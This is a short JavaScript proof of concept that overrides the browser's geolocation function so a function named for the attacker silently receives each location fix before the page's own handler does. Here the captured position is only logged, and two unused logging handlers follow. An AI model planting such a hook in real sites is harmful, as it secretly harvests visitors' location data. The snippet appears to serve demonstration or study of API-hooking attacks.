function attackersCallbackFunction(location) {
    console.log('Geoloc success')
    console.log(location)
}
var origGeoLoc = navigator.geolocation.getCurrentPosition;
navigator.geolocation.getCurrentPosition = function(){
    navigator.geolocation.getCurrentPosition = origGeoLoc;
    var originalSuccessCallbackFunction = arguments[0];
    navigator.geolocation.getCurrentPosition(function(params){
        attackersCallbackFunction(params);
        originalSuccessCallbackFunction(params);
    });
};



function success(position) {
    var latitude  = position.coords.latitude;
    var longitude = position.coords.longitude;

    console.log('&lt;p&gt;Latitude is ' + latitude + '° &lt;br&gt;Longitude is ' + longitude + '°&lt;/p&gt;');


};

function error() {
    console.log("Unable to retrieve your location");
};